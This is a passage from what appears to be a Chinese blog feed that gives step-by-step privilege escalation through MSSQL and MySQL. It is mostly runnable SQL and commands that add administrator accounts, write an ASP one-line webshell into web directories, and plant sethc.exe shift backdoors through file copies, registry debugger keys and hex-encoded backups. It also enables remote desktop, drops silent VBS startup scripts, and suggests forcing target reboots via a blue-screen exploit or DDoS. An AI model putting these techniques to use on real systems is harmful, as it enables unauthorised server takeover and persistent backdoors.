title="wscript.shell"></a>wscript.shell</h2><p><strong>xp_cmdshell无法使用</strong></p><ol><li>禁止了system调用cmd.exe。</li><li>mssql运行账户被改为user或power user，这个权限可以执行部分系统命令，但无法执行超越本身权限的命令，如net user &#x2F;add等。</li><li>xp_cmdshell被删除或改名。</li></ol><p><strong>解决方法：调用wscripts.shell</strong></p><p>利用SP_OACreate和SP_OAMETHOD调用系统对象wscript.shell来执行命令，在2005及以上版本中默认禁用。先判断存储过程这个字段是否存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;SP_OACreate&#x27;;</span><br><span class="line">select * from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;SP_OAMETHOD&#x27;;</span><br></pre></td></tr></table></figure><p>启动组件Ole Automation Procedures。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>声明变量@runshell，用SP_OACreate调用wscript.shell，并赋值变量，再用SP_OAMETHOD调用执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Declare @runshell INT;       </span><br><span class="line">Exec SP_OACreate &#x27;wscript.shell&#x27;,@runshell out;</span><br><span class="line">Exec SP_OAMETHOD @runshell,&#x27;run&#x27;,null,&#x27;net user test test /add&#x27;;</span><br></pre></td></tr></table></figure><p>写一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o int, @f int, @t int, @ret int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out;</span><br><span class="line">exec sp_oamethod @o, &#x27;createtextfile&#x27;, @f out, &#x27;可写目录&#x27;, 1;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;&lt;%execute(request(&quot;SB&quot;))%&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>创建用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int;</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out;</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user test test /add&#x27;,&#x27;c:\windows\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;;</span><br></pre></td></tr></table></figure><p>shift后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\windows\system32\cmd.exe&#x27;,&#x27;c:\windows\system32\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure><p>无法启用可能是删除了这个字段，可以用odsole70.dll恢复。</p><p>odsole70.dll存在时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc sp_OACreate,@dllname=&#x27;odsole70.dll&#x27;;</span><br><span class="line">exec sp_addextendedproc SP_OAMETHOD,@dllname=&#x27;odsole70.dll&#x27;;</span><br><span class="line">或者</span><br><span class="line">Use master dbcc addextendedproc(&#x27;sp_OACreate&#x27;,&#x27;odsole70.dll&#x27;);</span><br><span class="line">Use master dbcc addextendedproc(&#x27;SP_OAMETHOD&#x27;,&#x27;odsole70.dll&#x27;);</span><br></pre></td></tr></table></figure><p>odsole70.dll不存在时：</p><p>将odsole70.dll上传到目标机器的c盘根目录下，必须指定路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc sp_OACreate,@dllname=&#x27;c:\odsole70.dll&#x27;;</span><br><span class="line">exec sp_addextendedproc SP_OAMETHOD,@dllname=&#x27;c:\odsole70.dll&#x27;;</span><br></pre></td></tr></table></figure><p>这样添加账户失败原因：</p><ol><li>mssql运行账户被改为user或power user，这个权限可以执行部分系统命令，但无法执行超越本身权限的命令，如net user &#x2F;add等。</li><li>wscript.shell对象被删除或者改名。</li><li>SP_OACreate和SP_OAMETHOD两者被删除或者改名。</li></ol><h2 id="沙盒模式提权"><a href="#沙盒模式提权" class="headerlink" title="沙盒模式提权"></a><strong>沙盒模式提权</strong></h2><p>沙盒模式是一种安全功能。</p><p>在沙盒模式下，Access只对控件和字段属性中的安全且不含恶意代码的表达式求值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Jet\4.0\Engines\SandBoxMode</span><br></pre></td></tr></table></figure><p>默认键值是2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0       为在任何所有者中都禁止启用安全模式</span><br><span class="line">1       为仅在允许的范围内</span><br><span class="line">2       必须在access的模式下</span><br><span class="line">3       完全开启（连access也不支持）</span><br></pre></td></tr></table></figure><p>查看键值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;;</span><br></pre></td></tr></table></figure><p>启动沙盒（可能需要开启xp_regwrite存储过程，添加和开启步骤类似）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br></pre></td></tr></table></figure><p>调用前可能需要开启 OpenRowset&#x2F;OpenDatasource：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure><p>调用沙盒模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * From OpenRowSet(&#x27;Microsoft.Jet.OLEDB.4.0&#x27;,&#x27;;Database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;net user test test /add&quot;)&#x27;);</span><br></pre></td></tr></table></figure><p>或者在当前的web目录下面上传体系的ias.mdb、cmd.exe、net.exe三个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=E:\web\bias.mdb&#x27;,&#x27;select shell( E:\web\cmd.exe /c E:\web\net.exe user test test /add )&#x27;);</span><br></pre></td></tr></table></figure><p>ps：”c:\windows\system32\ias\ias.mdb”这个路径是2003的路径，2000的路径为”c:\winnt\system32\ias\ias.mdb”</p><p>沙盒模式未封闭（注册表值未置0），或者调用命令存在多余空格会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未能处理对象 &#x27;select shell( cmd.exe /c net user user passwd /add )&#x27;。OLE DB 提供程序 &#x27;microsoft.jet.oledb.4.0&#x27; 指出该对象中没有任何列。</span><br></pre></td></tr></table></figure><p>可能需要下载ACE.Oledb.12.0 for X64位驱动，并把连接字符串Microsoft.jet.Oledb.4.0更改为Microsoft.ACE.OLEDB.12.0。</p><p>失败原因：</p><ol><li>mssql运行账户被改为user或者power user，无法修改注册表。</li><li>xp_regwrite扩展过程被删除或改名。</li><li>ies.mdb文件丢失。</li></ol><h2 id="xp-dirtree启动项提权"><a href="#xp-dirtree启动项提权" class="headerlink" title="xp_dirtree启动项提权"></a><strong>xp_dirtree启动项提权</strong></h2><p>db_owner权限用户默认有系统备份权限。</p><p>查看启动项文件夹内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_dirtree &#x27;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动&#x27;,1,1;</span><br></pre></td></tr></table></figure><p>列数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DB_NAME();</span><br></pre></td></tr></table></figure><p>log备份shift后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alter database test set RECOVERY FULL;--</span><br><span class="line">create table cmd (a image);--</span><br><span class="line">backup log test to disk=&#x27;c:\bat&#x27; with init;--</span><br><span class="line">insert into cmd(a) values (0x636f707920433a5c57494e444f57535c73797374656d33325c636d642e65786520433a5c57494e444f57535c73797374656d33325c73657468632e657865);--</span><br><span class="line">backup log test to disk=&#x27;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.bat&#x27;;--</span><br><span class="line">drop table cmd;--</span><br></pre></td></tr></table></figure><p>或者备份一句话（0x3c2565786563757465287265717565737428225342222929253e）到web目录。</p><p>代码大致含义：</p><ol><li>恢复当前库。</li><li>创建表cmd。</li><li>备份当前库到c:\bat。</li><li>插入shift后门代码到创建的表cmd。</li><li>备份shift后门代码到启动项目录。</li><li>删除cmd表。</li></ol><p>差异备份。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk=&#x27;c:\database.bak&#x27;--</span><br><span class="line">create table cmd (cmd image)--</span><br><span class="line">insert into cmd(cmd) values(0x636f707920433a5c57494e444f57535c73797374656d33325c636d642e65786520433a5c57494e444f57535c73797374656d33325c73657468632e657865)--</span><br><span class="line">backup database test to disk=&#x27;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.bat&#x27; WITH DIFFERENTIAL FORMAT--</span><br><span class="line">drop table cmd--</span><br></pre></td></tr></table></figure><p>失败原因：</p><ol><li>对数据库没有备份权限。</li><li>对目录没有写入权限。</li><li>建表失败，备份失败等其他原因。</li></ol><h2 id="xp-regwrite注册表提权"><a href="#xp-regwrite注册表提权" class="headerlink" title="xp_regwrite注册表提权"></a><strong>xp_regwrite注册表提权</strong></h2><p>操作注册表只需要 db 权限及以上就可以，但是 db 权限不能写入注册表，sa 权限才可以写。ps：可能需要添加xp_regwrite存储过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_regwrite 根键，子键，键值名，值类型，值</span><br><span class="line">xp_regread  根键，子键，键值名</span><br></pre></td></tr></table></figure><ul><li>利用注册表启动项添加用户：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;Software\Microsoft\Windows\CurrentVertion\Policies\Explorer\Run&#x27;,&#x27;running&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe /c net user test test /add&#x27;;</span><br></pre></td></tr></table></figure><p>等待重启。</p><ul><li>映像劫持（不需要重启，文件内容不变）shift后门：</li></ul><p>c:\windows\system32\dllcache\是备份目录，假如system32下的sethc被发现替换了后删除，会从备份目录下进行拷贝过来，一本万利的做法是连备份目录的sethc也替换掉就OK了，但经尝试执行覆盖system32下的命令时，dllcache目录下的同时会被覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe&#x27;;</span><br></pre></td></tr></table></figure><ul><li>开启远程桌面：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;, &#x27;fDenyTSConnections&#x27;, &#x27;REG_DWord&#x27;,0;</span><br></pre></td></tr></table></figure><h2 id="sp-addlogin操作数据库账户"><a href="#sp-addlogin操作数据库账户" class="headerlink" title="sp_addlogin操作数据库账户"></a><strong>sp_addlogin操作数据库账户</strong></h2><p>需要sysadmin权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.sp_addlogin asd123,&#x27;123asd&#x27;;            #创建mssql帐号</span><br><span class="line">exec master.dbo.sp_addsrvrolemember asd123,sysadmin;     #提升至sysadmin权限</span><br><span class="line">exec sp_password NULL,&#x27;asd123&#x27;,&#x27;sa&#x27;       #修改sa用户密码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL提权</title>
      <link href="/2021/02/12/7e256e17.html"/>
      <url>/2021/02/12/7e256e17.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>MySQL本身不支持执行操作系统命令，但支持自定义函数。</li><li>分为：udf提权、启动项提权、mof提权，都是基于向MySQL导出文件，然后建立函数后执行代码。</li><li>必要条件：获取MySQL账号，需要有insert和delete权限（默认的启动权限是system）。</li></ul><h1 id="udf提权（win）"><a href="#udf提权（win）" class="headerlink" title="udf提权（win）"></a><strong>udf提权</strong>（win）</h1><p>udf是一类对MySQL功能进行扩充的代码，通过udf创建能够执行系统命令的函数。</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ol><li>目标主机系统是Windows（server 2000、XP、server 2003）。</li><li>MySQL服务未降权，且拥有该主机MySQL中的某个用户账号，此账号必须有insert和delete权限以创建和抛弃函数，一般为root用户。</li></ol><h2 id="有马步骤"><a href="#有马步骤" class="headerlink" title="有马步骤"></a>有马步骤</h2><ol><li><p>将自带udf.dll的shell上传到目标机上。</p></li><li><p>查找连接口令。</p><ul><li>翻数据库配置文件。</li><li>MySQL安装目录下&#x2F;data&#x2F;MySQL&#x2F;user.MYD，位数不足40位的就拼凑，加起来刚好40位的就尝试组合。连接成功后，可以先执行命令select * from mysql.user判断是否有读文件的权限。</li><li>暴破。</li></ul></li><li><p>导出dll文件。</p><ul><li>MySQL&lt;5.0，导出路径随意。</li><li>5.0&lt;MySQL&lt;5.1：c:\windows或c:\windows\system32或C:\Winnt，否则在下一步操作中会爆”No paths allowed for shared library”错误。只要把dll放到path环境变量下的任何一个目录，效果跟放到系统system32目录下面一样。</li><li>MySQL&gt;5.1：指定的插件目录例 如&#x2F;lib&#x2F;plugin。ps：可通过select @@plugin_dir;或show variables like ‘%plugin%’;命令查看。</li></ul><p>默认情况下plugin不存在，可在webshell中创建，也可利用NTFS ADS流（高版本MySQL禁止流的使用）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;           //查找到MySQL目录</span><br><span class="line">select &#x27;test&#x27; into dumpfile &#x27;C:\Program Files\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION&#x27;;        //创建lib目录</span><br><span class="line">select &#x27;test&#x27; into dumpfile &#x27;C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin::$INDEX_ALLOCATION&#x27;;      //创建plugin目录</span><br></pre></td></tr></table></figure><p>弹出这个错误表示创建成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error : Error writing file &#x27;C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin::$INDEX_ALLOCATION&#x27; (Errcode: 22)  </span><br></pre></td></tr></table></figure><p>报这个错说明开启了secure-file-priv。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure><p>查询配置项，值为NULL则禁止导入导出。作为攻击方讲道理是无法修改my.ini文件配置项的&#x3D;。&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>使用SQL语句创建功能函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create Function 函数名 returns string soname &#x27;导出的dll路径&#x27;；</span><br></pre></td></tr></table></figure><p>对于MySQL5.0以上版本，语句中的dll不允许带全路径，否则会报”Can’t open shared library”错误，这时必须将dll重新导出到系统目录。这个错误还可能是杀软检测到dll写入给删了，或者是dll版本搞错了。ps：假如创建函数时提示“Function ‘cmdshell’ already exists”，这是MySQL的bug，可以输入以下语句，然后重来一遍。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function 函数名;</span><br></pre></td></tr></table></figure><p>功能函数说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell          执行cmd</span><br><span class="line">downloader        到网上下载指定文件并保存到指定目录</span><br><span class="line">open3389          通用开3389终端服务,可指定端口(不改端口无需重启)</span><br><span class="line">backshell         反弹Shell</span><br><span class="line">ProcessView       枚举系统进程</span><br><span class="line">KillProcess       终止指定进程</span><br><span class="line">regread           读注册表</span><br><span class="line">regwrite          写注册表</span><br><span class="line">shut              关机,注销,重启</span><br><span class="line">about             说明与帮助函数</span><br></pre></td></tr></table></figure><p>常用语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &#x27;myudf.dll&#x27;;</span><br><span class="line">select cmdshell(&#x27;net user wawawa 123abc!@#$%^ /add&#x27;);</span><br><span class="line">select cmdshell(&#x27;net localgroup administrators wawawa /add&#x27;);</span><br><span class="line">drop function cmdshell;</span><br><span class="line">delete from MySQL.func where name=&#x27;cmdshell&#x27;;</span><br></pre></td></tr></table></figure><p>写注册表函数：映像劫持（不用重启，文件内容不变）shift后门。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select regwrite(&quot;HKEY_LOCAL_MACHINE&quot;,&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;,&quot;Debugger&quot;,&quot;REG_SZ&quot;,&quot;c:\windows\system32\cmd.exe&quot;);</span><br></pre></td></tr></table></figure></li><li><p>执行功能。</p><p>语法：select 创建的函数名(‘参数列表’)； </p><p>每个函数有不同的参数，可使用select 创建的函数名(‘help’)；来获得指定函数的参数列表信息。</p></li><li><p>使用完成后需删除导出的dll，删除dll前先删除创建的函数，否则删除操作将失败，语句参考第4步。</p></li></ol><h2 id="无马步骤"><a href="#无马步骤" class="headerlink" title="无马步骤"></a>无马步骤</h2><ol><li><p>利用MySQL命令行模式下提权。如果报错的话，就是路径问题，修改udf.txt最后导出的路径。同时需要注意secure-file-priv配置问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL.exe -h 172.16.10.11 -uroot -p    连接成功后，判断是否有读文件权限</span><br><span class="line">. c:\udf.txt    udf.txt的功能为创建表和数据然后导出udf.dll</span><br></pre></td></tr></table></figure><p>随后反弹shell或者添加账户都行。</p></li><li><p>udf.txt例子：</p><p>首先本地获取udf十六进制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;udf.dll&#x27;)) into dumpfile “同级目录下/udf.txt”；</span><br></pre></td></tr></table></figure><p>随后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table t_tmp(data LONGBLOB);</span><br><span class="line">insert into t_tmp values(&quot;&quot;);      //或者values里直接load_file加载源文件也可</span><br><span class="line">update t_tmp set data=concat(&#x27;&#x27;,udf文件的十六进制编码）</span><br><span class="line">select * from t_tmp into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\myudf.dll&#x27;; --</span><br></pre></td></tr></table></figure><p>最后要加个”–”，原因是PhpMyAdmin查询时可能会自动在语句末尾加上Limit 语句，导致出错。</p><p>执行完所有命令后手动输入或添加到udf.txt中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists t_tmp;</span><br></pre></td></tr></table></figure></li></ol><h1 id="udf提权（linux）"><a href="#udf提权（linux）" class="headerlink" title="udf提权（linux）"></a><strong>udf提权（linux）</strong></h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a><strong>条件</strong></h2><ol><li>root账号。</li><li>较低版本的MySQL或者没有设置skin-grant-tables的版本</li><li>plugin可写入。</li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>上传.so文件。</li><li>创建函数。</li><li>执行命令。</li></ol><p>sqlmap也可进行udf提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py --file-write=本地路径/lib_MySQLudf_sys.so --file-dest=/usr/lib/MySQL/plugin/</span><br><span class="line">sqlmap -d &quot;MySQL://root:pwd@ip:3306/test&quot; --os-shell</span><br></pre></td></tr></table></figure><h1 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a><strong>mof提权</strong></h1><p>适用面不广，通常针对低版本windows。</p><p>mof是windows系统的一个文件，叫做”托管对象格式”，利用了c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的nullevt.mof文件，每分钟有一个system权限的线程去执行一次（由”And TargetInstance.Second &#x3D; 5”;控制，5代表每分钟的第五秒执行）。执行SQL命令将系统中默认的nullevt.mof替换，让系统执行恶意的mof文件。</p><h2 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a><strong>条件</strong></h2><ol><li>win&lt;&#x3D;2003。</li><li>可写入c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录。</li><li>数据库允许外联，且高权限账号密码已知。</li></ol><h2 id="有马步骤-1"><a href="#有马步骤-1" class="headerlink" title="有马步骤"></a>有马步骤</h2><ol><li><p>获取root账户权限账户密码。找个可读可写的目录，上传mof文件。</p></li><li><p>执行SQL提权命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;上传的mof文件路径&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>此时mof文件内容是添加一个账户，等这个mof文件执行完成后，按相同的步骤再上传一个mof文件，内容是将账号添加到管理员组。ps：不能将两条命令写到一个文件里。</p></li></ol><h2 id="无马步骤-1"><a href="#无马步骤-1" class="headerlink" title="无马步骤"></a>无马步骤</h2><ol><li><p>利用MySQL命令行模式下提权，直接写入本地文件（load_file函数需转换成ascii码）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. c:\MySQL.txt </span><br><span class="line">. c:\MySQL2.txt </span><br></pre></td></tr></table></figure></li><li><p>关闭系统自动添加用户操作，要不会一直添加。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt停止服务</span><br><span class="line">删除文件夹C:\WINDOWS\system32\wbem\Repository\</span><br><span class="line">net start winmgmt启动服务</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a><strong>启动项提权</strong></h1><h2 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a><strong>条件</strong></h2><p>服务器上的 C:\Documents and Settings\All Users\「开始」菜单\程序\启动\目录是可读可写目录。</p><p>英文目录：C:\Documents and Settings\All Uses\Start Menu\Programs\Startup\   </p><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><p>执行命令，导出vbs文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text); </span><br><span class="line">insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot;); </span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user mmp mmp /add&quot;&quot;,0) &quot;); </span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators mmp/add&quot;&quot;,0) &quot;); </span><br><span class="line">insert into a values(&quot;del a.vbs&quot;);</span><br><span class="line">select * from a into outfile &quot;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.vbs&quot;; </span><br></pre></td></tr></table></figure><p>ps：</p><ul><li>这里只能使用”outfile”而不是”dumpfile”，否则表中的内容会写不全。</li><li>后面的0表示不弹出cmd窗口，静默运行。</li><li>也可用bat文件，但不推荐。因为启动运行时会有明显的DOS窗口出来，而用VBS脚本则可以完全隐藏窗口且不会有错误提示。</li></ul><p>也可直接导出可执行文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x木马的16进制 into dumpfile &#x27;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\server.exe&#x27;;</span><br></pre></td></tr></table></figure><p>导出成功后，重新启动系统，自动添加用户到管理员组中。关于重启目标服务器，可以利用一些可导致服务器蓝屏的EXP如MS12-020，或者DDoS拒绝服务。</p><p>bat文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text); </span><br><span class="line">insert into a values (&quot;net user mmp mmp /add&quot;); </span><br><span class="line">insert into a values (&quot;net localgroup administrators mmp /add&quot; ); </span><br><span class="line">insert into a values(&quot;del a.bat&quot;);</span><br><span class="line">select * from a into outfile &quot;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.bat&quot;;</span><br></pre></td></tr></table></figure><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a><strong>CVE</strong></h1><p>CVE-2016-6662 、CVE-2016-6663、CVE-2016-6664</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h2><ul><li>&lt;&#x3D;5.5.51    </li><li>&lt;&#x3D;5.6.32     </li><li>&lt;&#x3D;5.7.14</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h2><p>MySQL的配置文件中有一些不安全的设置，而加载的时候是利用较高权限进行加载的。绕过授权去修改配置文件导致提权。</p><h1 id="防范"><a href="#防范" class="headerlink" 